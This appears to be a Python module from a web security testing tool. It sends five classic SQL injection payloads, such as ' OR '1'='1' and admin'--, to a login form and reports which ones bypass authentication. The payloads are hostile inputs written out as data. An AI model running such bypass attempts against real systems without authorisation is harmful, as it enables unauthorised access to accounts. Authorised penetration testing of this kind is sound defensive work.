from modules.auth import attempt_login


class SQLInjection:
    def __init__(self, client):
        self.client = client

    def try_login(self, payload):
        success, _ = attempt_login(self.client, payload, "anything")
        return success

    def run(self):
        print("\n--- SQL Injection Testing ---")

        payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "admin'--",
            "' OR 1=1--",
        ]

        vulnerable_payloads = []

        for payload in payloads:
            success = self.try_login(payload)

            if success:
                print(f"    [VULNERABLE] Login bypassed with: {payload}")
                vulnerable_payloads.append(payload)
            else:
                print(f"    [SAFE]       Did not work: {payload}")

        print(f"\n[SUMMARY] {len(vulnerable_payloads)}/{len(payloads)} payloads bypassed login")
        if vulnerable_payloads:
            print("    SQL injection vulnerability confirmed on login form!")

        print("\n--- SQL Injection Testing Complete ---")